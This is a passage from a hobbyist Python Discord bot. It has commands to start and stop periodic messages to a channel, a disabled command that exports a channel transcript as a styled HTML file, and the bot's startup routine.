    except ValueError as e:
        await ctx.send(f"Error: {e}")
        return
    if channel.id in auto_senders:
        await ctx.send(f"Auto sender is already running for {channel.mention}.")
        return
    auto_sender = AutoSender(channel, cooldown_time, msg)
    auto_sender.start()
    auto_senders[channel.id] = auto_sender
    await ctx.send(f"Started sending periodic messages to {channel.mention} every {cooldown_time} seconds with message: {msg}")

@bot.command()
async def stopautosender(ctx, channel_id: int):
    try:
        channel = bot.get_channel(channel_id)
        if channel is None or channel.id not in auto_senders:
            raise ValueError(f"No auto sender is running for channel with ID {channel_id}.")
    except ValueError as e:
        await ctx.send(f"Error: {e}")
        return

    # Stop and remove the AutoSender task
    auto_senders[channel.id].stop()
    del auto_senders[channel.id]

    await ctx.send(f"Stopped sending periodic messages to {channel.mention}.")

'''@bot.command()
async def transcript(ctx, channel: discord.TextChannel = None):
    """Exports a full transcript including messages, embeds, and attachments, styled like transcript.html."""
    channel = channel or ctx.channel

    messages = []
    async for message in channel.history(limit=100):
        messages.append(message)

    messages.reverse()  # Ensure chronological order

    html_template = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <title>Transcript of #{channel_name}</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {{
                background-color: #36393f;
                color: #dcddde;
                font-family: "Whitney", "Helvetica Neue", Helvetica, Arial, sans-serif;
                font-size: 16px;
                margin: 0;
                padding: 0;
            }}
            .container {{
                padding: 20px;
                max-width: 800px;
                margin: auto;
            }}
            .message {{
                margin-bottom: 20px;
                border-bottom: 1px solid #4f545c;
                padding-bottom: 10px;
            }}
            .author {{
                font-weight: bold;
                color: #7289da;
            }}
            .timestamp {{
                font-size: 0.9em;
                color: #72767d;
            }}
            .content {{
                margin: 10px 0;
            }}
            .embed {{
                margin-top: 10px;
                padding: 10px;
                border-radius: 5px;
                border: 1px solid #4f545c;
                background-color: #2f3136;
            }}
            .embed-title {{
                font-weight: bold;
                margin-bottom: 5px;
                color: #ffffff;
            }}
            .embed-description {{
                margin-bottom: 10px;
                color: #b9bbbe;
            }}
            .embed-image {{
                max-width: 100%;
                border-radius: 5px;
            }}
            .file {{
                margin-top: 5px;
            }}
            .file a {{
                color: #00aff4;
                text-decoration: none;
            }}
            .file a:hover {{
                text-decoration: underline;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Transcript of #{channel_name}</h1>
            {messages}
        </div>
    </body>
    </html>
    """

    message_html = ""
    for message in messages:
        timestamp = message.created_at.strftime("%Y-%m-%d %H:%M:%S")
        content = message.clean_content.replace("\n", "<br>")
        author_avatar = message.author.avatar.url if message.author.avatar else ""

        # Base message block
        message_html += f"""
        <div class="message">
            <div>
                <img src="{author_avatar}" alt="avatar" width="40" height="40" style="border-radius:50%; vertical-align:middle; margin-right:10px;">
                <span class="author">{message.author}</span>
                <span class="timestamp">({timestamp})</span>
            </div>
            <div class="content">{content}</div>
        """

        # Handle embeds
        if message.embeds:
            for embed in message.embeds:
                embed_html = '<div class="embed">'
                if embed.title:
                    embed_html += f'<div class="embed-title">{embed.title}</div>'
                if embed.description:
                    embed_html += f'<div class="embed-description">{embed.description.replace("\n", "<br>")}</div>'
                if embed.url:
                    embed_html += f'<div><a href="{embed.url}" class="embed-link" target="_blank">{embed.url}</a></div>'
                if embed.image and embed.image.url:
                    embed_html += f'<img src="{embed.image.url}" alt="embed image" class="embed-image">'
                embed_html += '</div>'
                message_html += embed_html

        # Handle file attachments
        if message.attachments:
            for attachment in message.attachments:
                file_url = attachment.url
                file_name = attachment.filename
                message_html += f'<div class="file"><a href="{file_url}" target="_blank" download>{file_name}</a></div>'

        # Close message block
        message_html += "</div>"

    html_content = html_template.format(channel_name=channel.name, messages=message_html)

    # Save and send the transcript
    async with aiofiles.open("transcript.html", mode="w", encoding="utf-8") as file:
        await file.write(html_content)

    await ctx.send(file=discord.File("transcript.html"))'''
    
##################################
async def main():
    keep_alive()
    await bot.start(token)

asyncio.run(main())